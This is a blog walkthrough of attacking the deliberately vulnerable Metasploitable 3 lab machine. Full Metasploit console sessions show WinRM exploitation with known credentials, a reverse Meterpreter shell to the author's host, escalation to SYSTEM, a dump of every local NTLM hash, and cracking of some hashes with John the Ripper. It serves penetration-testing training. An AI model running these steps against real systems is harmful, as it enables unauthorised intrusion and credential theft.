---
layout: post
title: "Metasploitable 3 - Hashdump post Authentication"
date: 2017-01-16T12:04:00.001Z
author: gu4r15sm0
---

## Metasploitable 3

### 
Hashdump post Authentication

Hello again :)

This time we're going to exploit WinRM service running on the server and asume we found the Local Administrator's password but we don't have any other access to the machine.

msf > services

Services

\========

host         port   proto  name          state  info

\----         ----   -----  ----          -----  ----

10.20.10.23  21     tcp    ftp           open   Microsoft ftpd

10.20.10.23  22     tcp    ssh           open   OpenSSH 7.1 protocol 2.0

10.20.10.23  80     tcp    http          open   Microsoft-IIS/7.5 ( Powered by ASP.NET )

10.20.10.23  161    udp    snmp          open   SNMPv1 server public

10.20.10.23  445    tcp    smb           open

10.20.10.23  1617   tcp    nimrod-agent  open

10.20.10.23  3000   tcp    http          open   WEBrick/1.3.1 (Ruby/2.3.1/2016-04-26)

10.20.10.23  4848   tcp    https         open   Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8

10.20.10.23  5985   tcp    http          open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP

10.20.10.23  5986   tcp    http          open

10.20.10.23  8020   tcp    http          open   Apache httpd

10.20.10.23  8022   tcp    http          open   Apache Tomcat/Coyote JSP engine 1.1

10.20.10.23  8027   tcp                  open

10.20.10.23  8080   tcp    http          open   Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8

10.20.10.23  8282   tcp    http          open   Apache-Coyote/1.1

10.20.10.23  8383   tcp    https         open   Apache httpd

10.20.10.23  8484   tcp    http          open   Jetty winstone-2.8

10.20.10.23  8585   tcp    http          open   Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2 ( Powered by PHP/5.3.10 )

10.20.10.23  9200   tcp    http          open   Elasticsearch REST API 1.1.1 name: Mammomax; Lucene 4.7

10.20.10.23  9800   tcp    http          open

10.20.10.23  49153  tcp    msrpc         open   Microsoft Windows RPC

10.20.10.23  49154  tcp    msrpc         open   Microsoft Windows RPC

10.20.10.23  49263  tcp                  open

10.20.10.23  49264  tcp    tcpwrapped    open

msf exploit(winrm\_script\_exec) > options
Module options (exploit/windows/winrm/winrm\_script\_exec):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
   FORCE\_VBS  false            yes       Force the module to use the VBS CmdStager
   PASSWORD   vagrant          yes       A specific password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port\[,type:host:port\]\[...\]
   RHOST                       yes       The target address
   RPORT      5985             yes       The target port
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URI        /wsman           yes       The URI of the WinRM service
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   Administrator    yes       A specific username to authenticate as
   VHOST                       no        HTTP server virtual host
Exploit target:
   Id  Name
   --  ----
   0   Windows
I setup the target RHOST
msf exploit(winrm\_script\_exec) > setg RHOST 10.20.10.23
RHOST => 10.20.10.23
And the IP address to listen and wait for the meterpreter payload to connect back
msf exploit(winrm\_script\_exec) > set LHOST 10.23.10.200
LHOST => 10.23.10.200
msf exploit(winrm\_script\_exec) > set verbose true
verbose => true
I'm going to use the Visual Basic Script option instead of the PowerShell because I couldn't get the session open with PowerShell, I have to take a look at why is this happening. If you know why, please leave a comment, I appreciate any feedback.
msf exploit(winrm\_script\_exec) > set FORCE\_VBS true
FORCE\_VBS => true
msf exploit(winrm\_script\_exec) > options
Module options (exploit/windows/winrm/winrm\_script\_exec):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DOMAIN     WORKSTATION      yes       The domain to use for Windows authentification
   FORCE\_VBS  true             yes       Force the module to use the VBS CmdStager
   PASSWORD   vagrant          yes       A specific password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port\[,type:host:port\]\[...\]
   RHOST      10.20.10.23      yes       The target address
   RPORT      5985             yes       The target port
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URI        /wsman           yes       The URI of the WinRM service
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   Administrator    yes       A specific username to authenticate as
   VHOST                       no        HTTP server virtual host
Exploit target:
   Id  Name
   --  ----
   0   Windows
msf exploit(winrm\_script\_exec) > run
\[\*\] Started reverse TCP handler on 10.23.10.200:4444
\[\*\] User selected the FORCE\_VBS option
\[\*\] Command Stager progress -   2.01% done (2046/101936 bytes)
\[\*\] Command Stager progress -   4.01% done (4092/101936 bytes)
\[\*\] Command Stager progress -   6.02% done (6138/101936 bytes)
\[\*\] Command Stager progress -   8.03% done (8184/101936 bytes)
\[\*\] Command Stager progress -  10.04% done (10230/101936 bytes)
\[\*\] Command Stager progress -  12.04% done (12276/101936 bytes)
\[\*\] Command Stager progress -  14.05% done (14322/101936 bytes)
\[\*\] Command Stager progress -  16.06% done (16368/101936 bytes)
\[\*\] Command Stager progress -  18.06% done (18414/101936 bytes)
\[\*\] Command Stager progress -  20.07% done (20460/101936 bytes)
\[\*\] Command Stager progress -  22.08% done (22506/101936 bytes)
\[\*\] Command Stager progress -  24.09% done (24552/101936 bytes)
\[\*\] Command Stager progress -  26.09% done (26598/101936 bytes)
\[\*\] Command Stager progress -  28.10% done (28644/101936 bytes)
\[\*\] Command Stager progress -  30.11% done (30690/101936 bytes)
\[\*\] Command Stager progress -  32.11% done (32736/101936 bytes)
\[\*\] Command Stager progress -  34.12% done (34782/101936 bytes)
\[\*\] Command Stager progress -  36.13% done (36828/101936 bytes)
\[\*\] Command Stager progress -  38.14% done (38874/101936 bytes)
\[\*\] Command Stager progress -  40.14% done (40920/101936 bytes)
\[\*\] Command Stager progress -  42.15% done (42966/101936 bytes)
\[\*\] Command Stager progress -  44.16% done (45012/101936 bytes)
\[\*\] Command Stager progress -  46.16% done (47058/101936 bytes)
\[\*\] Command Stager progress -  48.17% done (49104/101936 bytes)
\[\*\] Command Stager progress -  50.18% done (51150/101936 bytes)
\[\*\] Command Stager progress -  52.19% done (53196/101936 bytes)
\[\*\] Command Stager progress -  54.19% done (55242/101936 bytes)
\[\*\] Command Stager progress -  56.20% done (57288/101936 bytes)
\[\*\] Command Stager progress -  58.21% done (59334/101936 bytes)
\[\*\] Command Stager progress -  60.21% done (61380/101936 bytes)
\[\*\] Command Stager progress -  62.22% done (63426/101936 bytes)
\[\*\] Command Stager progress -  64.23% done (65472/101936 bytes)
\[\*\] Command Stager progress -  66.24% done (67518/101936 bytes)
\[\*\] Command Stager progress -  68.24% done (69564/101936 bytes)
\[\*\] Command Stager progress -  70.25% done (71610/101936 bytes)
\[\*\] Command Stager progress -  72.26% done (73656/101936 bytes)
\[\*\] Command Stager progress -  74.26% done (75702/101936 bytes)
\[\*\] Command Stager progress -  76.27% done (77748/101936 bytes)
\[\*\] Command Stager progress -  78.28% done (79794/101936 bytes)
\[\*\] Command Stager progress -  80.29% done (81840/101936 bytes)
\[\*\] Command Stager progress -  82.29% done (83886/101936 bytes)
\[\*\] Command Stager progress -  84.30% done (85932/101936 bytes)
\[\*\] Command Stager progress -  86.31% done (87978/101936 bytes)
\[\*\] Command Stager progress -  88.31% done (90024/101936 bytes)
\[\*\] Command Stager progress -  90.32% done (92070/101936 bytes)
\[\*\] Command Stager progress -  92.33% done (94116/101936 bytes)
\[\*\] Command Stager progress -  94.34% done (96162/101936 bytes)
\[\*\] Command Stager progress -  96.34% done (98208/101936 bytes)
\[\*\] Command Stager progress -  98.35% done (100252/101936 bytes)
\[\*\] Sending stage (957487 bytes) to 10.20.10.23
\[\*\] Meterpreter session 1 opened (10.23.10.200:4444 -> 10.20.10.23:49305) at 2017-01-12 21:44:37 -0500
\[\*\] Session ID 1 (10.23.10.200:4444 -> 10.20.10.23:49305) processing InitialAutoRunScript 'post/windows/manage/priv\_migrate'
\[\*\] Current session process is UANwR.exe (4488) as: METASPLOITABLE3\\Administrator
\[\*\] Session is Admin but not System.
\[\*\] Will attempt to migrate to specified System level process.
\[\*\] Trying services.exe (472)
\[+\] Successfully migrated to services.exe (472) as: NT AUTHORITY\\SYSTEM
\[\*\] nil
\[\*\] Command Stager progress - 100.00% done (101936/101936 bytes)
Great! The exploit gave me SYSTEM privileges automatically
meterpreter > help
...
Priv: Elevate Commands
\======================
    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.
Priv: Password database Commands
\================================
    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database
Priv: Timestomp Commands
\========================
    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes
I got a meterpreter session with all the goodies
meterpreter > sysinfo
Computer        : METASPLOITABLE3
OS              : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en\_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
A hashdump will give me a list of all the local NTLM hashes
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
anakin\_skywalker:1010:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
artoo\_detoo:1006:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
ben\_kenobi:1008:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
boba\_fett:1013:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
chewbacca:1016:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
c\_three\_pio:1007:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
darth\_vader:1009:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
greedo:1015:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
han\_solo:1005:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
jabba\_hutt:1014:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
jarjar\_binks:1011:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
kylo\_ren:1017:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
lando\_calrissian:1012:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
leah\_organa:1003:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
luke\_skywalker:1004:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd\_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
meterpreter > **Ctrl+Z**
Background session 2? \[**y**/N\]
msf exploit(winrm\_script\_exec) > sessions
That was very nice, we can see the NTLM hashes of all the local users. Now instead of using JtR directly from the Linux command line, I can, first use the post exploitation hashdump module to populate my creds table
Active sessions
\===============
  Id  Type                     Information                                      Connection
  --  ----                     -----------                                      ----------
  2   meterpreter x64/windows  METASPLOITABLE3\\Administrator @ METASPLOITABLE3  10.23.10.200:4444 -> 10.20.10.23:49312 (10.20.10.23)
msf exploit(winrm\_script\_exec) > use post/windows/gather/hashdump
msf post(hashdump) > options
Module options (post/windows/gather/hashdump):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.
msf post(hashdump) > run
\[-\] Session not found
\[\*\] Post module execution completed
msf post(hashdump) > set SESSION 2
SESSION => 2
msf post(hashdump) > run
\[\*\] Obtaining the boot key...
\[\*\] Calculating the hboot key using SYSKEY af6e70a34bff69886e4fc480a73c573b...
\[\*\] Obtaining the user list and keys...
\[\*\] Decrypting user keys...
\[\*\] Dumping password hints...
No users with password hints on this system
\[\*\] Dumping password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
sshd:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd\_server:1002:aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035:::
leah\_organa:1003:aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028:::
luke\_skywalker:1004:aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a:::
han\_solo:1005:aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951:::
artoo\_detoo:1006:aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4:::
c\_three\_pio:1007:aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee:::
ben\_kenobi:1008:aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859:::
darth\_vader:1009:aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0:::
anakin\_skywalker:1010:aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa:::
jarjar\_binks:1011:aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4:::
lando\_calrissian:1012:aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f:::
boba\_fett:1013:aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9:::
jabba\_hutt:1014:aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76:::
greedo:1015:aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db:::
chewbacca:1016:aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8:::
kylo\_ren:1017:aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001:::
\[\*\] Post module execution completed
Now all the NTLM hashes are in my creds table
msf post(hashdump) > creds
Credentials
\===========
host         origin       service          public            private                                                            realm  private\_type
\----         ------       -------          ------            -------                                                            -----  ------------
10.20.10.23  10.20.10.23  8022/tcp (http)  admin             admin                                                                     Password
10.20.10.23  10.20.10.23  445/tcp (smb)    administrator     aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    guest             aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    vagrant           aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    sshd              aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    sshd\_server       aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    leah\_organa       aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    luke\_skywalker    aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    han\_solo          aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    artoo\_detoo       aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    c\_three\_pio       aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    ben\_kenobi        aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    darth\_vader       aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    anakin\_skywalker  aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    jarjar\_binks      aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    lando\_calrissian  aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    boba\_fett         aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    jabba\_hutt        aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    greedo            aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    chewbacca         aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8         NTLM hash
10.20.10.23  10.20.10.23  445/tcp (smb)    kylo\_ren          aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001         NTLM hash
And then use the metasploit's JtR auxiliar module ( you can see all the JtR modules available)
msf post(hashdump) > use auxiliary/analyze/jtr\_
use auxiliary/analyze/jtr\_aix            use auxiliary/analyze/jtr\_mssql\_fast     use auxiliary/analyze/jtr\_postgres\_fast
use auxiliary/analyze/jtr\_crack\_fast     use auxiliary/analyze/jtr\_mysql\_fast
use auxiliary/analyze/jtr\_linux          use auxiliary/analyze/jtr\_oracle\_fast
msf post(hashdump) > use auxiliary/analyze/jtr\_crack\_fast
msf auxiliary(jtr\_crack\_fast) > options
Module options (auxiliary/analyze/jtr\_crack\_fast):
   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   CONFIG                                 no        The path to a John config file to use instead of the default
   CUSTOM\_WORDLIST                        no        The path to an optional custom wordlist
   ITERATION\_TIMOUT                       no        The max-run-time for each iteration of cracking
   JOHN\_PATH                              no        The absolute path to the John the Ripper executable
   KoreLogic             false            no        Apply the KoreLogic rules to Wordlist Mode(slower)
   MUTATE                false            no        Apply common mutations to the Wordlist (SLOW)
   POT                                    no        The path to a John POT file to use instead of the default
   USE\_CREDS             true             no        Use existing credential data saved in the database
   USE\_DB\_INFO           true             no        Use looted database schema info to seed the wordlist
   USE\_DEFAULT\_WORDLIST  true             no        Use the default metasploit wordlist
   USE\_HOSTNAMES         true             no        Seed the wordlist with hostnames from the workspace
   USE\_ROOT\_WORDS        true             no        Use the Common Root Words Wordlist
I setup my own pot file instead of the default because I used it on my last post.
msf auxiliary(jtr\_crack\_fast) > set POT metasploitable3/pot
POT => metasploitable3/pot
msf auxiliary(jtr\_crack\_fast) > run

\[\*\] Wordlist file written out to /tmp/jtrtmp20170112-12024-1g0drpi

\[\*\] Hashes Written out to /tmp/hashes\_tmp20170112-12024-lwsn2l

\[\*\] Cracking lm hashes in normal wordlist mode...

\[\*\] Loaded 1 password hash (LM \[DES 128/128 XOP-16\])

Press 'q' or Ctrl-C to abort, almost any other key for status

0g 0:00:00:00 DONE (Thu Jan 12 22:13:17 2017) 0g/s 2573Kp/s 2573Kc/s 2573KC/s CLAIR..VAGRANT

Session completed

\[\*\] Cracking lm hashes in single mode...

\[\*\] Loaded 1 password hash (LM \[DES 128/128 XOP-16\])

Press 'q' or Ctrl-C to abort, almost any other key for status

0g 0:00:00:03 DONE (Thu Jan 12 22:13:20 2017) 0g/s 5300Kp/s 5300Kc/s 5300KC/s WU1900..E1900

Session completed

\[\*\] Cracking lm hashes in incremental mode (All4)...

\[\*\] Loaded 1 password hash (LM \[DES 128/128 XOP-16\])

fopen: /usr/share/john/all.chr: No such file or directory

\[\*\] Cracking lm hashes in incremental mode (Digits)...

\[\*\] Loaded 1 password hash (LM \[DES 128/128 XOP-16\])

Warning: MaxLen = 8 is too large for the current hash type, reduced to 7

Press 'q' or Ctrl-C to abort, almost any other key for status

0g 0:00:00:00 DONE (Thu Jan 12 22:13:21 2017) 0g/s 32679Kp/s 32679Kc/s 32679KC/s 0769790..0769743

Session completed

\[\*\] Cracked Passwords this run:

\[\*\] Cracking nt hashes in normal wordlist mode...

\[\*\] Loaded 18 password hashes with no different salts (NT \[MD4 128/128 XOP 4x2\])

Press 'q' or Ctrl-C to abort, almost any other key for status

\[\*\] vagrant          (vagrant)

1g 0:00:00:00 DONE (Thu Jan 12 22:13:21 2017) 20.00g/s 1944Kp/s 1944Kc/s 33151KC/s e..vagrant

Warning: passwords printed above might not be all those cracked

Use the "--show" option to display all of the cracked passwords reliably

Session completed

\[\*\] Cracking nt hashes in single mode...

\[\*\] Loaded 18 password hashes with no different salts (NT \[MD4 128/128 XOP 4x2\])

\[\*\] Remaining 17 password hashes with no different salts

Press 'q' or Ctrl-C to abort, almost any other key for status

\[\*\] pr0t0c0l         (c\_three\_pio)

1g 0:00:00:10 DONE (Thu Jan 12 22:13:32 2017) 0.09532g/s 7190Kp/s 7190Kc/s 116817KC/s p1900..vagrant1900

Warning: passwords printed above might not be all those cracked

Use the "--show" option to display all of the cracked passwords reliably

Session completed

\[\*\] Cracking nt hashes in incremental mode (Digits)...

\[\*\] Loaded 18 password hashes with no different salts (NT \[MD4 128/128 XOP 4x2\])

\[\*\] Remaining 16 password hashes with no different salts

Press 'q' or Ctrl-C to abort, almost any other key for status

0g 0:00:00:04 DONE (Thu Jan 12 22:13:36 2017) 0g/s 24746Kp/s 24746Kc/s 395941KC/s 73673954..73673952

Session completed

\[\*\] Cracked Passwords this run:

\[+\] c\_three\_pio:pr0t0c0l:12:12

\[+\] vagrant:vagrant:5:5

\[+\] administrator:vagrant:3:3

\[+\] vagrant:vagrant:5:5

\[+\] administrator:vagrant:3:3

\[\*\] Auxiliary module execution completed

And now I have the clear text passowrds for those user's in my creds table in case I need them

msf auxiliary(jtr\_crack\_fast) > creds

Credentials

\===========

host         origin       service          public            private                                                            realm  private\_type

\----         ------       -------          ------            -------                                                            -----  ------------

10.20.10.23  10.20.10.23  8022/tcp (http)  admin             admin                                                                     Password

10.20.10.23  10.20.10.23  445/tcp (smb)    administrator     aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    guest             aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    vagrant           aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    sshd              aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    sshd\_server       aad3b435b51404eeaad3b435b51404ee:8d0a16cfc061c3359db455d00ec27035         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    leah\_organa       aad3b435b51404eeaad3b435b51404ee:8ae6a810ce203621cf9cfa6f21f14028         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    luke\_skywalker    aad3b435b51404eeaad3b435b51404ee:481e6150bde6998ed22b0e9bac82005a         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    han\_solo          aad3b435b51404eeaad3b435b51404ee:33ed98c5969d05a7c15c25c99e3ef951         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    artoo\_detoo       aad3b435b51404eeaad3b435b51404ee:fac6aada8b7afc418b3afea63b7577b4         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    c\_three\_pio       aad3b435b51404eeaad3b435b51404ee:0fd2eb40c4aa690171ba066c037397ee         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    ben\_kenobi        aad3b435b51404eeaad3b435b51404ee:4fb77d816bce7aeee80d7c2e5e55c859         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    darth\_vader       aad3b435b51404eeaad3b435b51404ee:b73a851f8ecff7acafbaa4a806aea3e0         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    anakin\_skywalker  aad3b435b51404eeaad3b435b51404ee:c706f83a7b17a0230e55cde2f3de94fa         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    jarjar\_binks      aad3b435b51404eeaad3b435b51404ee:ec1dcd52077e75aef4a1930b0917c4d4         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    lando\_calrissian  aad3b435b51404eeaad3b435b51404ee:62708455898f2d7db11cfb670042a53f         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    boba\_fett         aad3b435b51404eeaad3b435b51404ee:d60f9a4859da4feadaf160e97d200dc9         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    jabba\_hutt        aad3b435b51404eeaad3b435b51404ee:93ec4eaa63d63565f37fe7f28d99ce76         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    greedo            aad3b435b51404eeaad3b435b51404ee:ce269c6b7d9e2f1522b44686b49082db         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    chewbacca         aad3b435b51404eeaad3b435b51404ee:e7200536327ee731c7fe136af4575ed8         NTLM hash

10.20.10.23  10.20.10.23  445/tcp (smb)    kylo\_ren          aad3b435b51404eeaad3b435b51404ee:74c0a3dd06613d3240331e94ae18b001         NTLM hash

10.20.10.23               445/tcp (smb)    c\_three\_pio       pr0t0c0l:12                                                               Password

10.20.10.23               445/tcp (smb)    vagrant           vagrant:5                                                                 Password

10.20.10.23               445/tcp (smb)    administrator     vagrant:3                                                                 Password
And that's it for now, I found 2 passwords for 3 users.

Playing with other JtR rules can give us a couple more passwords.